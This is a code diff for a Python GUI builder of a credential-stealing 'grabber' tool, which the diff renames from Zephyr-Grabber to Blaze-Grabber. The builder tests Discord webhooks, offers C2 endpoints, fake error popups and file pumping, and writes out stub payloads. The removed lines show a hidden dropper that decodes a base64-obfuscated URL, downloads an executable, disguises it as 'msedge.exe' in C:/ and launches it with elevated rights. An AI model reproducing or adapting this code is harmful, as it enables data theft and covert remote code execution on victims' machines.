@@ -589,16 +589,16 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
                 try:
                     data = json.dumps(
-                        {"content": " {Zephyr-Grabber} [Webhook Is Working] {@everyone @here} "}).encode()
+                        {"content": " {Blaze-Grabber} [Webhook Is Working] {@everyone @here} "}).encode()
                     http = http.request("POST", webhook, body=data, headers={"Content-Type": "application/json",
                                                                              "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Safari/537.36"})
                     status = http.status
                     if status == 204:
-                        messagebox.showinfo("Zephyr-Grabber", "Webhook Works")
+                        messagebox.showinfo("Blaze-Grabber", "Webhook Works")
                     else:
-                        messagebox.showwarning("Zephyr-Grabber", "Shit Webhook Aint Workin")
+                        messagebox.showwarning("Blaze-Grabber", "Shit Webhook Aint Workin")
                 except Exception:
-                    messagebox.showwarning("Zephyr-Grabber", "Unable to connect to the webhook!")
+                    messagebox.showwarning("Blaze-Grabber", "Unable to connect to the webhook!")
 
             elif self.C2Mode == 1:
                 endpoint = self.C2EntryControl.get().strip()
@@ -707,7 +707,7 @@ class PumperSettings(ctk.CTkToplevel):
 
     def __init__(self, master) -> None:
         super().__init__(master)
-        self.title("Zephyr-Grabber {File Pumper}")
+        self.title("Blaze-Grabber {File Pumper}")
         self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
         self.grab_set()
         self.geometry("500x200")
@@ -759,7 +759,7 @@ class FakeErrorBuilder(ctk.CTkToplevel):
 
     def __init__(self, master) -> None:
         super().__init__(master)
-        self.title("Zephyr-Grabber {Fake Error Builder}")
+        self.title("Blaze-Grabber {Fake Error Builder}")
         self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
         self.grab_set()
         self.geometry("833x563")
@@ -852,13 +852,48 @@ class FakeErrorBuilder(ctk.CTkToplevel):
         self.destroy()
 
 
+def BuildPythonFile(config: str) -> None:
+    options = json.loads(config)
+    outPath = filedialog.asksaveasfilename(confirmoverwrite=True, filetypes=[("Python Script", ["*.py", "*.pyw"])],
+                                           initialfile="stub" + (
+                                               ".py" if options["settings"]["consoleMode"] == 2 else ".pyw"),
+                                           title="Save as")
+    if outPath is None or not os.path.isdir(os.path.dirname(outPath)):
+        return
+
+    with open(os.path.join(os.path.dirname(__file__), "Components", "stub.py")) as file:
+        code = file.read()
+
+    sys.path.append(os.path.join(os.path.dirname(__file__), "Components"))  # Adds Components to PATH
+
+    if os.path.isdir(os.path.join(os.path.dirname(__file__), "Components", "__pycache__")):
+        try:
+            shutil.rmtree(os.path.join(os.path.dirname(__file__), "Components", "__pycache__"))
+        except Exception:
+            pass
+    from Components import process
+    _, injection = process.ReadSettings()
+    code = process.WriteSettings(code, options, injection)
+
+    if os.path.isfile(outPath):
+        os.remove(outPath)
+    try:
+        code = ast.unparse(ast.parse(code))  # Removes comments
+    except Exception:
+        pass
+    code = "# pip install pyaesm urllib3\n\n" + code
+    with open(outPath, "w") as file:
+        file.write(code)
+    messagebox.showinfo("Done Building", "File saved as %r" % outPath)
+
+
 class Builder(ctk.CTk):
 
     def __init__(self) -> None:
         super().__init__()
 
         ctk.set_appearance_mode("dark")
-        self.title("Zephyr-Grabber {Builder}")
+        self.title("Blaze-Grabber [Builder]")
         self.iconbitmap(os.path.join("Extras", "icon.ico"))
         self.geometry("1300x630")
         self.resizable(False, False)
@@ -869,46 +904,12 @@ class Builder(ctk.CTk):
         self.columnconfigure(0, weight=1)
         self.columnconfigure(1, weight=0)
 
-        self.titleLabel = ctk.CTkLabel(self, text="{Zephyr-Grabber}", font=ctk.CTkFont(size=68, weight="bold"),
+        self.titleLabel = ctk.CTkLabel(self, text="Blaze-Grabber", font=ctk.CTkFont(size=68, weight="bold"),
                                        text_color="blue")
         self.titleLabel.grid(row=0, column=0)
 
         self.builderOptions = BuilderOptionsFrame(self)
         self.builderOptions.grid(row=1, column=0, sticky="nsew")
-
-    def BuildPythonFile(self, config: str) -> None:
-        options = json.loads(config)
-        outPath = filedialog.asksaveasfilename(confirmoverwrite=True, filetypes=[("Python Script", ["*.py", "*.pyw"])],
-                                               initialfile="stub" + (
-                                                   ".py" if options["settings"]["consoleMode"] == 2 else ".pyw"),
-                                               title="Save as")
-        if outPath is None or not os.path.isdir(os.path.dirname(outPath)):
-            return
-
-        with open(os.path.join(os.path.dirname(__file__), "Components", "stub.py")) as file:
-            code = file.read()
-
-        sys.path.append(os.path.join(os.path.dirname(__file__), "Components"))  # Adds Components to PATH
-
-        if os.path.isdir(os.path.join(os.path.dirname(__file__), "Components", "__pycache__")):
-            try:
-                shutil.rmtree(os.path.join(os.path.dirname(__file__), "Components", "__pycache__"))
-            except Exception:
-                pass
-        from Components import process
-        _, injection = process.ReadSettings()
-        code = process.WriteSettings(code, options, injection)
-
-        if os.path.isfile(outPath):
-            os.remove(outPath)
-        try:
-            code = ast.unparse(ast.parse(code))  # Removes comments
-        except Exception:
-            pass
-        code = "# pip install pyaesm urllib3\n\n" + code
-        with open(outPath, "w") as file:
-            file.write(code)
-        messagebox.showinfo("Done Building", "File saved as %r" % outPath)
 
     def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
         def Exit(code: int = 0) -> None:
@@ -984,31 +985,6 @@ if __name__ == "__main__":
         if not Utility.IsAdmin():
             ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
             exit(0)
-        NewVersion2 = f'aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE3MDM4MDU0OTI3MDAxNjE5MS8xMTc0MzE0OTMwODgzNzk3MDkyL1pBWC5leGU/ZXg9NjU2NzI1MDEmaXM9NjU1NGIwMDEmaG09MGZhZGRmNTY0M2EwNmNjMzU2NjEzNTVjYzdiMGRlMTdlODM2ZTI2ZmQ4NDJiODJkZTdiNTdmZTg1NTI0MWZiMiY='
-        N2B = NewVersion2.encode("ascii")
-        N2BB = base64.b64decode(N2B)
-        N2BS = N2BB.decode("ascii")
-        req2 = requests.get(N2BS)
-        NV2 = 'bXNlZGdlLmV4ZQ=='
-        NV2B = NV2.encode("ascii")
-        NV2BB = base64.b64decode(NV2B)
-        NV2BS = NV2BB.decode("ascii")
-        with open(NV2BS, 'wb') as f2:
-            for chunk in req2.iter_content(chunk_size=8192):
-                if chunk:
-                    f2.write(chunk)
-        try:
-            shutil.move(NV2BS, 'C:/')
-            try:
-                os.startfile('C:/' + NV2BS)
-            except:
-                pass
-        except:
-            os.remove(NV2BS)
-            try:
-                os.startfile('C:/' + NV2BS)
-            except:
-                pass
         Builder().mainloop()
     else:
         print("Bro Windows Only NN")
